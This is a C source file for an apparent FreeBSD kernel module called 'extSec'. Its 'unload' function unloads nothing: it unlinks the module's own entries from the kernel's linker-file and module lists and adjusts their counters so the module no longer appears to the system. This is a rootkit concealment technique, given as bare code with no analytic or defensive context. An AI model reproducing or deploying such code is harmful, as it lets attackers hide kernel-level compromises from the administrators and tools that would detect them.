#include "extSec.h"

extern linker_file_list_t linker_files;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module)	link;
	TAILQ_ENTRY(module)	flink;
	struct linker_file	*file;
	int			refs;
	int			id;
	char			*name;
	modeventhand_t		handler;
	void			*arg;
	modspecific_t		data;
};

void unload(void) {
	struct linker_file *lf;
	struct module *mod;

	mtx_lock(&Giant);

	(&linker_files)->tqh_first->refs--;

	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, VERSION) == 0) {
			next_file_id--;
			TAILQ_REMOVE(&linker_files, lf, link);
			break;
		}
	}

	mtx_unlock(&Giant);

	sx_xlock(&modules_sx);

	TAILQ_FOREACH(mod, &modules, link) {
		if(strcmp(mod->name, "extSec") == 0) {
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);
}
